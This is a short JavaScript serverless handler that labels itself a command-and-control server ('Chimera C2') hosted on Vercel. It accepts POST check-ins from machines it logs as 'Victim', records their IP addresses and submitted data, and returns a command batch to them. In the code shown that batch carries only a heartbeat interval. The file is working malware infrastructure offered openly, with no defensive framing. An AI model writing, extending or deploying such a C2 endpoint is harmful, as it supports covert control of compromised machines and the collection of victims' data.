// Vercel C2 Server Endpoint
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const timestamp = new Date().toISOString();
    
    if (req.method === 'POST') {
        const clientData = req.body;
        const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        console.log(`[${timestamp}] Victim: ${clientIP}`, clientData);
        
        const commands = {
            type: "command_batch",
            timestamp: timestamp,
            commands: [
                {
                    id: Date.now(),
                    type: "heartbeat_response",
                    interval: 30000
                }
            ]
        };
        
        return res.status(200).json(commands);
    }
    
    if (req.method === 'GET') {
        return res.status(200).json({
            status: "online",
            server: "Chimera C2",
            timestamp: timestamp
        });
    }
    
    return res.status(405).json({ error: "Method not allowed" });
}